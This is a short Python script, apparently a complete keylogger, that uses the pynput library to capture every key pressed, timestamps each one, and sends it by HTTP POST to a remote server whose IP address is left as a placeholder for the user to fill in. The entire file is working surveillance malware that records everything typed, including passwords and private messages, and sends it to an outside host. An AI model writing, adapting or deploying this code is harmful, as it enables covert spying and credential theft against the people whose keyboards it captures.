import datetime
import requests

from datetime import datetime
import pynput
keyServer = "http://XX.XXX.XXX.XX:XXXX" # Insert your server IP here


def on_press(key):
    current_time_formatted = datetime.now().strftime("%Y-%m-%d : %H:%M:%S")
    prepared_key = "[%s]: %s pressed" % (current_time_formatted, key)
    prepared_obj = {"Body": prepared_key}
    requests.post(keyServer, data=prepared_obj)


with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()